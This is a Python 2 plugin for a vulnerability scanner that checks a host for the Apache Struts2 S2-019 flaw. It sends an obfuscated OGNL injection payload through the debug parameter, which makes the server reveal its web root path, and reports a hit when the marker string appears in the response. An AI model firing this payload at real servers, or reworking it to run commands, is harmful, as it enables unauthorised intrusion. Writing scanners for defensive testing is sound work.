#!/usr/bin/env python
# encoding: utf-8
# from ..t import T
from t  import T
import requests
class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        target_url = ''
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'

        result = {}
        timeout=3
        result['result']=False
        res=None
        payload = "debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path88888887:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()"

        print target_url
        try:
            headers = {"Content-Type":"application/x-www-form-urlencoded"}
            r = requests.post(target_url,data=payload,headers=headers,timeout=5)
            res_html = r.text
        except Exception,e:
            print e
            return result
        finally:
            if res is not None:
                res.close()
                del res
                
        if res_html.find("88888887") <> -1:
      

            info = target_url + "struts019  Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='struts019 Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=payload
            result['VerifyInfo']['result'] =info
            result['VerifyInfo']['level'] = 'hole'
            return result
        return result

if __name__ == '__main__':
    print P().verify(ip='www',port='8089')
            
            
            
            